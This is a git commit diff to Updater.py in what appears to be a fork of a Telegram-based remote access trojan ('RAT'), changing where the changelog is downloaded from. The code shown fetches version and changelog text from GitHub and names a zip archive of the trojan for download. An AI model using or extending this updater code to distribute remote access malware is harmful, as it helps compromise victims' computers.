1fdbba7e9a89d4300204d8564a2f58f94034752e
BBgamesTV <bastienbrousse4@gmail.com>
2024-01-24 14:09:01 +0100

    e

--- Updater.py
+++ Updater.py
@@ -7,7 +7,7 @@ import urllib.request
 
 
 RAT_Version = urllib.request.urlopen('https://raw.githubusercontent.com/BBgamesTV/Aprilia/main/Version/Version.txt').read().decode('utf8').splitlines()[0]
-RAT_Changelogs = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Changelogs.txt').read().decode('utf8')
+RAT_Changelogs = urllib.request.urlopen('https://raw.githubusercontent.com/BBgamesTV/Aprilia/main/Version/Changelogs.txt').read().decode('utf8')
 RAT_Link = 'https://github.com/Bainky/Telegram-RAT/archive/master.zip'
 RAT_Path = 'Telegram-RAT.zip'
 
